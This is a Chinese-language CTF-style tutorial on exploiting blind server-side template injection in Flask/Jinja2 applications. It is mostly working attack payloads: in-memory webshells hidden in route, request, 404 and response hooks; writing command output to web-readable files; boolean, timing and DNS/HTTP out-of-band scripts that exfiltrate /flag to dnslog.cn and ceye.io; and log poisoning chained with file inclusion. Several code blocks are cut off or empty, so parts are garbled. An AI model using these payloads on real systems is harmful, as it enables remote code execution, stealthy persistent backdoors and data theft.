# 1. 概述

## 1.1 定义

**无回显 SSTI**：注入点确实存在，Payload 也确实被模板引擎执行了，但是渲染结果不会出现在 HTTP 响应里，看不到执行结果。

```python
# eg:
# 漏洞代码：渲染结果只用于打日志，响应永远是固定的 "ok"
from flask import Flask, request, render_template_string
import logging

app = Flask(__name__)

@app.route('/submit')
def submit():
    name = request.args.get('name', '')
    # SSTI 注入点
    rendered = render_template_string(f"Hello {name}")
    logging.info(rendered)   # ← 渲染结果只写到日志
    return "ok"              # ← 响应永远是 "ok"
```

访问 `/submit?name=&#123;&#123;7*7}}`，响应永远是 `ok`，看不到 `49`，但服务端日志里确实写了 `Hello 49`。漏洞存在，但是看不到

## 1.2 成因

- **（1）渲染结果被丢弃**

模板被用来生成**邮件 / 日志 / PDF / 推送消息**，渲染完就喂给别的模块，响应里不带。
→ **典型解法**：盲注 / OOB 外带 / 内存马自造接口

- **（2）输出被过滤或转义**

框架开启了自动转义（autoescape），或者业务做了 HTML 实体编码、长度截断。
→ **典型解法**：写文件（绕过转义）/ 盲注 / 内存马

- **（3）异步任务**

渲染发生在 Celery / RQ / Kafka 消费者里，HTTP 响应早就返回了。
→ **典型解法**：必须用 OOB（DNSLog） / 写文件 / 内存马

- **（4）渲染发生在错误路径 / 重定向**

比如 500 错误页用了模板，正常路径不触发。
→ **典型解法**：先稳定触发条件，再用任意方式

- **（5）FastAPI / Tornado返回固定 JSON**

模板执行了，但响应体是固定的 JSON，根本不包含渲染产物。
→ **典型解法**：内存马（注册新路由） / OOB

## 1.3 无回显场景判断SSTI

- **时间延迟探测**

```python
# Jinja2 — 利用大循环
&#123;% for i in range(10000000) %}&#123;% endfor %}

# Jinja2 — 利用 sleep
&#123;&#123; ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['__import__']('time').sleep(5) }}
```

请求时间从 < 0.1s 变成 > 5s → 注入存在

- **DNSLog 外带探测**

```python
# 触发 DNS 查询
&#123;&#123; ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['__import__']('socket').gethostbyname('test.xxx.dnslog.cn') }}
```

在 DNSLog 平台看到记录 → 注入存在

- **错误差异侧信道**

```txt
?name=&#123;&#123;7*7}}     → 200, Content-Length: 12
?name=&#123;&#123;7*'a'}}   → 500, Content-Length: 1024 (异常页)
```

状态码 / 长度差异 = 可观测信号

- **副作用观测**

```python
# 让服务端建一个文件
&#123;&#123; ''.__class__.__mro__[1].__subclasses__()[FILE_INDEX]('/tmp/xxxx', 'w') }}
```

通过另一个 LFI 接口 / SSRF / 日志接口确认 `/tmp/xxxx` 是否存在

## 1.4 利用 + 决策

```
┌─────────────────────────────────────────────────┐
│             无回显 SSTI 的六大利用方向              │
├─────────────────────────────────────────────────┤
│ ① 内存马        — 注册新路由，自造回显接口            │ 
│ ② 写静态文件    — 把结果写到 web 可访问目录           │ 
│ ③ 盲注          — 布尔 / 时间 / OOB 逐字符外带      │ 
│ ④ 响应劫持      — 篡改当前响应头 / 体                │ 
│ ⑤ 日志投毒      — 写日志 → LFI 二次读取             │ 
│ ⑥ 副信道外带    — 邮件 / Webhook / DB / Session    │ 
└─────────────────────────────────────────────────┘
```

**决策**

````
能拿到框架 app 对象？
├─ 是 → 内存马（一劳永逸）
└─ 否 → 有可写的 Web 目录？
        ├─ 是 → 写静态文件
        └─ 否 → 能出网？
                ├─ 是 → OOB 盲注
                └─ 否 → 时间/布尔盲注
````

# 2. 内存马

## 2.1 了解

原注入点不回显 → 那就自己造一个会回显的接口

└──**>** 内存马逻辑：既然 `/submit` 接口不给我看结果，那我就用SSTI在app上注册一个`/shell`路由，这个路由我自己涉及，那这样一来想怎么看就怎么看

- **对比文件马**

| 维度     | 文件马（webshell.php） | 内存马             |
| -------- | ---------------------- | ------------------ |
| 落地     | 写硬盘                 | 仅存内存           |
| 检测     | 文件扫描可发现         | 必须运行时检测     |
| 持久化   | 重启仍在               | 进程重启失效       |
| 绕过 WAF | 难                     | 容易（无文件特征） |
| 适用     | 实战渗透               | CTF + 短期持久化   |

## 2.2 前置原理：Flask请求生命周期

### **Flask处理一次请求的完整链路**

```
# 钩子（Hook）就是在请求的固定节点，可以插入自定义代码的地方
浏览器请求 /xxx
        │
        ▼
┌────────────────────┐
│  WSGI 入口         │
│  app.__call__()    │
└────────┬───────────┘
         ▼
┌────────────────────┐
│  before_request    │  ← 钩子①（内存马注入点 A） //写内存马，让所有请求都执行恶意代码
│  钩子链            │
└────────┬───────────┘
         ▼
┌────────────────────┐
│  url_map 路由匹配   │  ← 钩子②（内存马注入点 B：add_url_rule） //动态添加恶意路由，实现 webshell
│  → view_func       │
└────────┬───────────┘
         ▼
┌────────────────────┐
│  view_func 执行    │  → 返回 response
└────────┬───────────┘
         ▼
┌────────────────────┐
│  after_request     │  ← 钩子③（内存马注入点 C：劫持响应） //劫持响应，让无回显 SSTI 的结果输出到页面
└────────┬───────────┘
         ▼
┌────────────────────┐
│  errorhandler      │  ← 钩子④（异常时触发） //利用报错信息带出 SSTI 执行结果
└────────────────────┘
```

- **利用发现**

`url_map`、`before_request_funcs`、`after_request_funcs`、`error_handler_spec` 这些**都是运行时可变的普通 Python 容器**！

只要拿到 `app` 对象，往里塞东西就行——这就是 Flask 内存马的根本原理

### **拿到`app`对象**

只有拿到了app对象才能进入链路，接触到钩子列表，然后用append把恶意代码塞进去

- **三种方式**

**A：通过 `url_for`**

```python
&#123;&#123; url_for.__globals__['current_app'] }}
```

**原理**：`url_for` 是 Flask 内置函数，它的 `__globals__` 是 `flask.helpers` 模块的命名空间，里面有 `current_app`（current_app是Flask 提供的一个全局代理对象，它永远指向当前正在处理请求的那个 Flask 应用实例）

**B：通过`request`**

```python
&#123;&#123; request.application }}     # 直接拿到 app
# 或者
&#123;&#123; request.environ['werkzeug.request'].__class__.__bases__[0]... }}
```

**C：通过`lipsum`**

```python
&#123;&#123; lipsum.__globals__['__builtins__']['__import__']('flask').current_app }}
```

**原理**：`lipsum` 是 Jinja2 自带的"假文本生成函数"，它本身就是一个普通 Python 函数，`__globals__` 里有 `__builtins__`，从这一路打到 `flask.current_app`

- **三种方式对比**

| 场景             | 推荐方式  | Payload 片段                         |
| ---------------- | --------- | ------------------------------------ |
| 通用             | `url_for` | `url_for.__globals__['current_app']` |
| 引号被过滤       | `lipsum`  | `lipsum.__globals__['__builtins__']` |
| `url_for` 不可用 | `request` | `request.application`                |
| 极端过滤         | `config`  | `config['__class__']....` 链         |

## 2.3 内存马一：路由型

>注册一个新路由 `/shell`，访问时执行 `?cmd=xxx` 并把结果返回

### 链路

- **（1）拿到app对象**

```python
url_for.__globals__['current_app'] 
```

- **（2）调用`add_url_rule`注册新路由**

```
add_url_rule(rule, endpoint, view_func) 三个参数：

┌ rule：      URL 路径，比如 /shell
├ endpoint：  内部名字，不能和已存在的重名
└ view_func： 处理函数，要返回字符串
```

- **（3）view_func 必须是个 callable，且能访问 `os.popen`**

由于 Jinja2 里不能写 `def`，只能用 `lambda`。lambda 里要访问 `os`、`request`，得想办法把它们带进去

- **（4）访问`/shell?cmd=id`拿结果**

### payload

基础完整版

```python
&#123;&#123;
  url_for.__globals__['__builtins__']['eval'](
    "app.add_url_rule('/shell','shell',lambda :__import__('os').popen(request.args.get('cmd','id')).read())",
    {
      'app': url_for.__globals__['current_app'],
      'request': url_for.__globals__['request']
    }
  )
}}
```

**逐行拆解：**

| 部分                                          | 作用                             |
| --------------------------------------------- | -------------------------------- |
| `url_for.__globals__['__builtins__']['eval']` | 常规拿到 `eval`，能代码执行      |
| `"app.add_url_rule(...)"`                     | 真正的注入代码，注册新路由       |
| 第二个参数 `{'app':..., 'request':...}`       | 给 eval 提供执行环境（命名空间） |
| `lambda :__import__('os').popen(...).read()`  | view_func 本体，访问时执行命令   |

**触发：**

```
GET /shell?cmd=cat /flag
```

防重复版

```python
&#123;&#123;
  url_for.__globals__['__builtins__']['exec'](
    "app=url_for.__globals__['current_app']\n"
    "import random,string\n"
    "name=''.join(random.choices(string.ascii_lowercase,k=8))\n"
    "app.add_url_rule('/'+name,name,lambda:__import__('os').popen(__import__('flask').request.args.get('c','id')).read())\n"
    "print(name)",
    {'url_for': url_for}
  )
}}
```

### 注意点

1. **endpoint 重名报错**：如果触发两次，第二次会报 `View function mapping is overwriting an existing endpoint`。
   - 解决：endpoint 用随机字符串，或者套 `try/except`
2. **lambda 内不能直接 `import`** ：必须用 `__import__('os')`
3. **request 上下文丢失**：lambda 执行时仍在请求上下文内，因为 Flask 一直在请求中处理这个 SSTI

## 2.4 内存马二：`before_request`钩子型

> 不需要新增URL，避免了路由型明显的`/shell`，访问任何已有路径都可以触发，相对前者增加了隐蔽性

### 原理

`app.before_request_funcs` 是一个 dict

```python
{None: [func1, func2, ...]}
```

我们往这个列表里 append （ps：往列表的末尾，添加一个新元素）一个函数，所有请求都会触发它

### 链路

- **（1）拿到app**

```python
url_for.__globals__['current_app']  还是这样
```

- **（2）写一个钩子函数**

```python
def hook():
    cmd = request.args.get('cmd')
    if cmd:
        return os.popen(cmd).read()  # 提前返回，绕过原 view_func
```

- **（3）注册**

```python
app.before_request_funcs.setdefault(None, []).append(hook)
```

### payload

完整payload

```python
&#123;&#123;
  url_for.__globals__['__builtins__']['exec'](
    "app=url_for.__globals__['current_app']\n"
    "from flask import request\n"
    "def hook():\n"
    "    c=request.args.get('shell')\n"
    "    if c: return __import__('os').popen(c).read()\n"
    "app.before_request_funcs.setdefault(None,[]).append(hook)",
    {'url_for': url_for}
  )
}}
```

**触发：**访问网站任意 URL，加 `?shell=id` 即可

```
GET /index?shell=cat /flag
GET /login?shell=whoami
GET /any/path?shell=ls
```

### 注意点

- `before_request` 函数返回非 None 值会**直接作为响应返回**并跳过 view_func——这正是我们想要的
- 隐蔽性强但**所有请求都会执行 `if c`** ，性能略有影响（CTF 无所谓）

## 2.5 内存马三：`errorhandler`型

> 劫持 404 处理器，访问任何不存在的 URL 都触发

### payload

```python
&#123;&#123;
  url_for.__globals__['__builtins__']['exec'](
    "app=url_for.__globals__['current_app']\n"
    "from flask import request\n"
    "def h(e):\n"
    "    c=request.args.get('cmd')\n"
    "    if c: return __import__('os').popen(c).read()\n"
    "    return 'Not Found',404\n"
    "app.register_error_handler(404, h)",
    {'url_for': url_for}
  )
}}
```

**触发：**

```
GET /not_exist_path_xxx?cmd=id
```

正常用户看到 404，攻击者拿到结果。隐蔽度 MAX

## 2.6 内存马四：`after_request`响应劫持

> 不新增接口，把命令结果塞进所有响应的 Header 或 Body

### payload

```python
&#123;&#123;
  url_for.__globals__['__builtins__']['exec'](
    "app=url_for.__globals__['current_app']\n"
    "from flask import request\n"
    "def after(resp):\n"
    "    c=request.args.get('cmd')\n"
    "    if c: resp.headers['X-Result']=__import__('os').popen(c).read()\n"
    "    return resp\n"
    "app.after_request(after)",
    {'url_for': url_for}
  )
}}
```

**触发**：访问任意路径加 `?cmd=id`，从响应头 `X-Result` 读结果

## 2.9 总结

```
内存马三步走（永远不变）：
  ① 拿 app  →  ② 选钩子  →  ③ 设计回显
```

| 钩子类型         | 隐蔽性 | 触发方式              | 适用场景 |
| ---------------- | ------ | --------------------- | -------- |
| 路由型           | ★★     | 访问特定 URL          | 简单粗暴 |
| `before_request` | ★★★★   | 任意 URL + 特殊参数   | 推荐     |
| `errorhandler`   | ★★★★★  | 访问不存在的 URL      | 隐蔽至上 |
| `after_request`  | ★★★    | 任意 URL + 响应头读取 | 数据外带 |

# 3. 写入静态文件

有两种可写文件目标

```
目标一：写入可执行脚本（WebShell）
  → 直接写一个 shell.php 到 Web 目录
  → 后续通过 shell.php 执行任意命令
  → 一步到位，最终目标

目标二：写入静态数据文件（读取命令结果）
  → 把命令执行结果写入 result.txt / 1.html
  → 然后浏览器访问这个文件读取结果
  → 相当于把"回显"转移到另一个文件里
```

这里讲解目标二，写入静态文件

## 3.1 思路与条件

- **核心思路**

注入点不返回结果 → 把结果写到一个 Web 服务器能访问到的文件里 → 用浏览器 GET 这个文件

```
┌──────────────────┐    SSTI执行命令       ┌──────────────┐
│  攻击者           │ ─────────────────→  │  服务器        │
│                  │                     │              │
│                  │                     │  执行结果      │
│                  │                     │  ↓写入        │
│                  │  GET /static/x.txt  │  static/x.txt│
│                  │ ←─────────────────  │              │
└──────────────────┘                     └──────────────┘
```

- **适用条件**

1. **有写权限的目录** —— `static/`、`/tmp/`、`uploads/`             # 这里可以去看upload里的`2.WEB服务器目录结构`
2. **该目录的文件能通过 URL 访问** —— Flask 默认 `static/` 映射 `/static/`，能直接访问

- **对比内存马**

| 维度           | 内存马         | 写文件             |
| -------------- | -------------- | ------------------ |
| 权限要求       | 拿到 app 对象  | 文件写权限         |
| 持久化         | 进程重启失效   | 重启仍在           |
| 隐蔽性         | 高             | 低（文件可被扫描） |
| Payload 复杂度 | 高             | 低                 |
| 适用场景       | RCE + 框架可控 | 任意能写文件的场景 |

## 3.2 原理

了解模板引擎如何写文件

### Python中能写文件的对象

```python
open('xxx', 'w').write('data')          # 最常用
__builtins__.open(...)                  # 等价
io.FileIO('xxx', 'w').write(b'data')    # 二进制
os.popen('echo data > xxx')             # shell 重定向
```

在 Jinja2 沙箱里这些都不能直接用，必须**通过 `__subclasses__` 链找到**

## 3.3 Jinja2写静态文件

### (1) 通过 `__subclasses__` 找 FileIO

**思路**

- **（1）列出所有子类，找`<class '_io.FileI0'>的索引`**

```python
&#123;&#123; ''.__class__.__mro__[1].__subclasses__() }}
```

输出一长串列表，**人工或脚本找到 `_io.FileIO` 在第几个**（不同 Python 版本不一样，常见是 96 或 117 等）

- **（2）用FileIO打开文件**

```python
&#123;&#123; ''.__class__.__mro__[1].__subclasses__()[INDEX]('static/x.txt', 'w') }}
```

- **（3）调用`write`写入数据**

```python
&#123;&#123; ''.__class__.__mro__[1].__subclasses__()[INDEX]('static/x.txt', 'w').write('hello') }}
```

- **（4）close盘（否则可能读到空文件）**

```python
&#123;% set f = ''.__class__.__mro__[1].__subclasses__()[INDEX]('static/x.txt', 'w') %}
&#123;% if f.write('hello') %}&#123;% endif %}
&#123;% if f.close() %}&#123;% endif %}
```

- **（5）访问读取**

```
GET /static/x.txt    →   hello
```

**完整payload**

```python
&#123;% set cmd_result = ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read() %}
&#123;% set f = ''.__class__.__mro__[1].__subclasses__()[FILE_INDEX]('static/flag.txt', 'w') %}
&#123;&#123; f.write(cmd_result) }}
&#123;&#123; f.close() }}
```

然后浏览器访问 `/static/flag.txt`

**自动找FileIO索引的脚本**

```python
import requests
for i in range(500):
    r = requests.get(f"http://target/?name=&#123;&#123;&#123;&#123; ''.__class__.__mro__[1].__subclasses__()[{i}] }}}}")
    if 'FileIO' in r.text or 'wrapper' in r.text:
        print(i, r.text[:200])
```

### (2) `os.popen` + shell重定向

- **思路**

直接让shell写

```bash
cat /flag > /app/static/flag.txt
```

- **payload**

````python
&#123;&#123; url_for.__globals__['__builtins__']['__import__']('os').popen('cat /flag > static/flag.txt').read() }}
````

或短点

```python
&#123;&#123; lipsum.__globals__['os'].popen('id > static/r.txt').read() }}
```

- **有缺点**

```
- ✅ Payload 短小，不用找 FileIO 索引
- ✅ 可以用 shell 的所有功能（grep、awk 处理输出）
- ❌ 需要 os.popen 可用（沙箱严格时不行）
- ❌ 需要服务有 cat/sh 等命令
```

### (3) 直接拿`__builtins__.open`

```python
&#123;% set os = url_for.__globals__['os'] %}
&#123;% set open = url_for.__globals__['__builtins__']['open'] %}
&#123;% set f = open('static/r.txt','w') %}
&#123;&#123; f.write(os.popen('id').read()) }}
&#123;&#123; f.close() }}
```

比较简洁，但要求 `url_for.__globals__` 中能拿到 `open`/`__builtins__`

### 三种方法对比

| 方法                      | Payload 长度 | 沙箱友好度  | 推荐度 |
| ------------------------- | ------------ | ----------- | ------ |
| `__subclasses__` + FileIO | 长           | 任何场景    | ★★★    |
| `os.popen` + 重定向       | 短           | 需 popen    | ★★★★★  |
| `__builtins__.open`       | 中           | 需 builtins | ★★★★   |

## 3.7 注意点+总结

| 注意点                          | 现象                          | 解决                                         |
| ------------------------------- | ----------------------------- | -------------------------------------------- |
| 写完没刷盘                      | 访问到空文件                  | 显式 `close()` 或用 `os.popen` 让 shell 处理 |
| 路径权限不足                    | `PermissionError`             | 换 `/tmp`、`uploads/`、`instance/`           |
| 后缀被拒                        | nginx 配置只允许 `.txt`/`.js` | 写成 `.txt` 而不是 `.html`                   |
| 文件名过滤                      | 含 `.` 被拦                   | URL 编码 `\x2e`                              |
| 容器静态文件缓存                | 多次访问仍然 404              | 文件名加随机后缀 / 换路径                    |
| Flask static 路径不是项目根目录 | 写到错的地方找不到            | 先 `&#123;&#123; config['STATIC_FOLDER'] }}` 确认      |

```
写文件三步走：
  ① 找到「既可写又可被 URL 访问」的目录
  ② 用 os.popen 重定向 / FileIO / open 三选一写入
  ③ HTTP GET 该文件读取
```

**最常用的 one-liner**：

```python

```

然后访问 `/static/r.txt`

```

  → 用不同引擎的语法测试：

  → 通过页面源码找静态资源路径
```

# 4. 盲注

## 前置了解

- **核心场景**

前面说过的内存马和写入静态文件都有个前提：能RCE

但如果遇到严格的沙箱，文件系统只读、写不了文件，框架对象拿不到、没法注册路由。那么就尝试盲注

- **适用条件**

| 可观测信号                        | 利用方式 | 典型场景         |
| --------------------------------- | -------- | ---------------- |
| 页面差异（200/500、长度、关键字） | 布尔盲注 | 异常页面不同     |
| 响应时间差异                      | 时间盲注 | 任何场景（万能） |
| 能出网（DNS/HTTP）                | OOB 带外 | 最快最稳         |

## 4.1 布尔盲注

### 原理

利用 Jinja2 的条件表达式让页面在**两种可区分的状态**间切换：

```
&#123;&#123; 条件 and 正常值 or 异常值 }}
```

- 条件为**真** → 返回正常值 → 200 / 固定长度
- 条件为**假** → 返回异常值（如 `1/0`）→ 500 / 异常页面

通过观察响应状态码 / 长度 / 关键字，判断条件真假

### 步骤

- **(1) 找一个稳定的差异点**

```python
# 测试两个payload
# Payload A（正常）
&#123;&#123; 1 }}
→ 响应：200, Content-Length: 123

# Payload B（异常）
&#123;&#123; 1/0 }}
→ 响应：500, Content-Length: 5678
```

确认状态码或长度有明显差异

- **(2) 构造判断逻辑**

假设要判断 `/flag` 第一个字符是不是 `f`

```python
&#123;&#123; 
  ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['open']('/flag').read()[0] == 'f'
  and 1 
  or 1/0 
}}
```

**逻辑拆解**

| 部分                      | 作用                    |
| ------------------------- | ----------------------- |
| `open('/flag').read()[0]` | 读 flag 第一个字符      |
| `== 'f'`                  | 判断是否等于 `f`        |
| `and 1`                   | 真则返回 1（正常）      |
| `or 1/0`                  | 假则触发除零异常（500） |

- **逐字符爆破**

```python
# 第 1 个字符
?name=&#123;&#123; ... [0]=='f' and 1 or 1/0 }}  → 200 ✅
?name=&#123;&#123; ... [0]=='g' and 1 or 1/0 }}  → 500 ❌

# 第 2 个字符
?name=&#123;&#123; ... [1]=='l' and 1 or 1/0 }}  → 200 ✅
?name=&#123;&#123; ... [1]=='m' and 1 or 1/0 }}  → 500 ❌

# ...依此类推
```

- **二分法加速**

不用逐个试 `a-z`，用 ASCII 码二分

```
# 判断第 0 个字符的 ASCII 是否 > 109 (m)
&#123;&#123; ... ord(read()[0]) > 109 and 1 or 1/0 }}
```

每次砍掉一半的字符集，加快测试的速度

### payload

- **基础版**

```python
# 判断第 i 个字符是否为 c
&#123;&#123;
  ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['open']('/flag').read()[i] == 'c'
  and 1
  or 1/0
}}
```

- **二分版**

```python
# 判断第 i 个字符 ASCII 是否 > mid
&#123;&#123;
  ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['open']('/flag').read()[i]|int > mid
  and 1
  or 1/0
}}
```

**`|int`** 是 Jinja2 过滤器，把字符转 ASCII

- **简化**

```python
&#123;&#123;
  url_for.__globals__['__builtins__']['open']('/flag').read()[i] == 'c'
  and 1
  or 1/0
}}
```

### 自动化脚本

- **枚举**

```python

result = ""

    found = False
    for c in charset:

        r = requests.get(url, params={"name": payload})
        
        # 判断响应

        break

```

- **二分**

```python

        else:  # 假 → ASCII <= mid
            high = mid - 1
    
    if low > 126:  # 超出范围 = 结束

```

## 4.2 时间盲注

### 原理

通过**响应时间差异**判断条件真假：

```
&#123;&#123; 条件 and sleep(5) or 0 }}
```

- 条件为真 → 执行 `sleep(5)` → 响应延迟 5 秒
- 条件为假 → 返回 0 → 立即响应

### 步骤

- **(1) 拿到`time.sleep`**

```python
&#123;&#123; ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['__import__']('time').sleep(5) }}
```

简化：

```python
&#123;&#123; url_for.__globals__['__builtins__']['__import__']('time').sleep(5) }}
```

- **(2) 构造判断条件**

```python
&#123;&#123;
  url_for.__globals__['__builtins__']['open']('/flag').read()[0] == 'f'
  and url_for.__globals__['__builtins__']['__import__']('time').sleep(5)
  or 0
}}
```

逻辑：

1. 第 0 个字符是 `f` → 延迟 5 秒

2. 不是 `f` → 立即返回

- **(3) 计时判断**

```python
import time
start = time.time()
requests.get(url, params={"name": payload})
elapsed = time.time() - start

if elapsed > 4:  # 留 1 秒容错
    print("条件为真")
else:
    print("条件为假")
```

### 无`time`模块场景

某些沙箱禁用了 `time`，用**大循环**制造延迟

- **Jinja2 for循环**

```python

```

```python
&#123;% endif %}
```

- **利用`__subclasses__`计算**

```python
&#123;&#123; ''.__class__.__mro__[1].__subclasses__() * 100000 }}
```

payload

```python
&#123;&#123;

    url_for.__globals__['__builtins__']['open']('/flag').read()[i] == 'c'
```


## 4.3 OOB带外盲注

### 原理

把数据**拼接到域名或 URL 里**，通过 DNS 查询或 HTTP 请求发送到攻击者控制的服务器。

```
服务器执行：socket.gethostbyname('flag{xxx}.attacker.com')
                                    ↓
                            触发 DNS 查询
                                    ↓
                        攻击者的 DNSLog 平台收到记录
```

### 步骤

- **(1) 申请DNSLog域名**

访问 [http://dnslog.cn](http://dnslog.cn/) 或 [http://ceye.io，获取一个子域名：](http://ceye.xn--io,:-n84fui067awma27zy1it49i/)

```
xxx.dnslog.cn
```

- **(2) 读flag并拼接到域名**

```python
# 读 flag
flag = open('/flag').read()

# 拼接成域名（假设 flag 是 "flag{test}"）
domain = flag + '.xxx.dnslog.cn'
# 结果：flag{test}.xxx.dnslog.cn
```

- **(3) 触发DNS查询**

```python
import socket
socket.gethostbyname(domain)
```

- **(4) 在DNSLog平台查看**

刷新 dnslog.cn 页面，看到：

```
flag{test}.xxx.dnslog.cn
```

### DNS查询触发

| 方式                   | Payload 片段                                         | 优点          | 缺点             | 推荐度 |
| ---------------------- | ---------------------------------------------------- | ------------- | ---------------- | ------ |
| `socket.gethostbyname` | `__import__('socket').gethostbyname(...)`            | 只需 DNS 出网 | 需要 socket 模块 | ★★★★★  |
| `urllib.urlopen`       | `__import__('urllib').request.urlopen('http://...')` | 可传更多数据  | 需 HTTP 出网     | ★★★★   |
| `os.popen('curl')`     | `os.popen('curl http://...')`                        | 简单粗暴      | 需有 curl 命令   | ★★★    |

- **`socket.gethostbyname`**

```python
&#123;&#123;
  url_for.__globals__['__builtins__']['__import__']('socket').gethostbyname(
    url_for.__globals__['__builtins__']['open']('/flag').read().replace('\n','') + '.xxx.dnslog.cn'
  )
}}
```

- **`urllib`**

```python
&#123;&#123;
  url_for.__globals__['__builtins__']['__import__']('urllib').request.urlopen(
    'http://xxx.ceye.io/' + url_for.__globals__['__builtins__']['open']('/flag').read()
  )
}}
```

- **`curl`**

```python
&#123;&#123;
  lipsum.__globals__['os'].popen(
    'curl http://xxx.ceye.io/?flag=' + lipsum.__globals__['__builtins__']['open']('/flag').read()
  ).read()
}}
```

### 字符集处理

**问题**：特殊字符导致 DNS 查询失败

Flag 可能含 `{}`、`/`、空格等非法 DNS 字符，直接拼会报错

- **Base64编码**


DNS 子域名最长 63 字符，flag 超长需分段

```python

&#123;&#123; ... open('/flag').read()[0:20].encode().hex() + '.xxx.dnslog.cn' }}

# 第 2 段
&#123;&#123; ... open('/flag').read()[20:40].encode().hex() + '.xxx.dnslog.cn' }}
```

### payload


## 4.4 盲注自动化

```python
    """二分查找第 i 个字符"""
    while low <= high:
        mid = (low + high) // 2
        payload = f"&#123;&#123;&#123;&#123; url_for.__globals__['__builtins__']['open']('/flag').read()[{i}]|int > {mid} and 1 or 1/0 }}}}"
        
        r = requests.get(url, params={"name": payload})

            low = mid + 1
        else:
            high = mid - 1
    
    return chr(low) if low <= 126 else None
```

#### 通用盲注框架

```python
import requests
import time
import string

class SSTIBlind:
    def __init__(self, url, param='name'):
        self.url = url
        self.param = param
        self.result = ""
    
    def boolean_blind(self, max_len=50):
        """布尔盲注"""
        for i in range(max_len):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                payload = f"&#123;&#123;&#123;&#123; url_for.__globals__['__builtins__']['open']('/flag').read()[{i}]|int > {mid} and 1 or 1/0 }}}}"
                r = requests.get(self.url, params={self.param: payload})
                if r.status_code == 200:
                    low = mid + 1
                else:
                    high = mid - 1
            if low > 126:
                break
            self.result += chr(low)
            print(f"[+] {self.result}")
        return self.result
    
    def time_blind(self, max_len=50):
        """时间盲注"""
        for i in range(max_len):
            for c in string.printable:
                payload = f"&#123;&#123;&#123;&#123; (url_for.__globals__['__builtins__']['open']('/flag').read()[{i}] == '{c}' and url_for.__globals__['__builtins__']['__import__']('time').sleep(3)) or 0 }}}}"
                start = time.time()
                requests.get(self.url, params={self.param: payload}, timeout=10)
                if time.time() - start > 2.5:
                    self.result += c
                    print(f"[+] {self.result}")
                    break
            else:
                break
        return self.result
    
    def oob_blind(self, dnslog_domain):
        """OOB 盲注"""
        payload = f"&#123;&#123;&#123;&#123; url_for.__globals__['__builtins__']['__import__']('socket').gethostbyname(url_for.__globals__['__builtins__']['__import__']('base64').b64encode(url_for.__globals__['__builtins__']['open']('/flag').read().encode()).decode().replace('=','') + '.{dnslog_domain}') }}}}"
        requests.get(self.url, params={self.param: payload})
        print(f"[*] 已触发，请在 {dnslog_domain} 查看记录")

# 使用
blind = SSTIBlind("http://target.com/vuln")
```

# 5. 响应劫持 / Header外带

> 当前面的都行不通时，劫持当前这次请求的响应，把数据塞进 Header 或 Cookie

### 原理

- **Flask响应对象**

每次请求结束前，Flask 会调用 `after_request` 钩子，可以修改响应：

```python
@app.after_request
def hook(response):
    response.headers['X-Flag'] = open('/flag').read()
    return response
```

- **在SSTI中动态注册**

```python
app.after_request(lambda resp: setattr(resp.headers, 'X-Flag', open('/flag').read()) or resp)
```

### 步骤

- **(1) 拿到app对象**

```py
&#123;&#123; url_for.__globals__['current_app'] }}
```

- **(2) 注册`after_request`钩子**

```python
&#123;&#123;
  url_for.__globals__['current_app'].after_request(
    lambda resp: (
      resp.headers.__setitem__('X-Flag', url_for.__globals__['__builtins__']['open']('/flag').read()),
      resp
    )[1]
  )
}}
```

逻辑拆解：

```
lambda resp: ... 是钩子函数

resp.headers.__setitem__('X-Flag', ...) 设置响应头

(操作, resp)[1] 是 Python 技巧：执行操作后返回 resp
```

- **(3) 触发**

访问**任意路径**（包括当前注入点），响应头里就有：

```
X-Flag: flag{test123}
```

### payload

```python
&#123;&#123;
  url_for.__globals__['__builtins__']['exec'](
    "app=url_for.__globals__['current_app']\n"
    "def hook(resp):\n"
    "    resp.headers['X-Data']=__import__('base64').b64encode(open('/flag','rb').read()).decode()\n"
    "    return resp\n"
    "app.after_request(hook)",
    {'url_for': url_for}
  )
}}
```

# 6. 日志投毒 + 二次利用

## 原因

**场景**：

- 没有任何直接回显通道
- 但应用会把**请求信息写进日志**（如 nginx access.log、Flask app.log）
- 且存在 **LFI（本地文件包含）** 或 **日志查看接口**

**核心思路：**

```
SSTI 执行命令 → 把结果写进日志 → 通过 LFI/日志接口读取
```

**典型组合拳：**

```python
① SSTI 注入点（无回显）
         ↓
② 把 flag 写进 User-Agent / 异常信息
         ↓
③ 触发日志记录
         ↓
④ 通过 LFI 读 /var/log/nginx/access.log
```

## 步骤

- **(1) 确认日志路径**

| 服务     | 日志路径                       |
| -------- | ------------------------------ |
| Nginx    | `/var/log/nginx/access.log`    |
| Apache   | `/var/log/apache2/access.log`  |
| Flask    | `app.log` / `/tmp/flask.log`   |
| Gunicorn | `/var/log/gunicorn/access.log` |

- **(2) 构造Payload把结果写进日志**

1. **方法一**：

利用 **User-Agent**

```python
# 在 SSTI 注入点触发异常，异常信息含 flag
&#123;&#123;
  url_for.__globals__['__builtins__']['__import__']('logging').error(
    url_for.__globals__['__builtins__']['open']('/flag').read()
  )
}}
```

或者直接在 User-Agent 里注入：

```bash
curl -H "User-Agent: &#123;&#123;lipsum.__globals__['os'].popen('cat /flag').read()}}" http://target.com/vuln
```

日志里会记录：

```
192.168.1.1 - - [13/May/2026:12:00:00] "GET /vuln HTTP/1.1" 200 123 "-" "flag{test123}"
```

2. **方法二：**

触发异常并记录：

```python
&#123;&#123;
  url_for.__globals__['__builtins__']['__import__']('sys').stderr.write(
    url_for.__globals__['__builtins__']['open']('/flag').read()
  )
}}
```

Flask 的 stderr 会写进日志

3. **通过LFI读取日志**

假设存在 LFI 接口：

```
http://target.com/download?file=../../var/log/nginx/access.log
```

或者利用 SSTI 本身读日志：

```
&#123;&#123; url_for.__globals__['__builtins__']['open']('/var/log/nginx/access.log').read() }}
```

## payload

- **SSTI + LFI**

```python
# 第一步：SSTI 写日志
&#123;&#123;
  url_for.__globals__['__builtins__']['__import__']('logging').getLogger().error(
    'FLAG_START:' + url_for.__globals__['__builtins__']['open']('/flag').read() + ':FLAG_END'
  )
}}

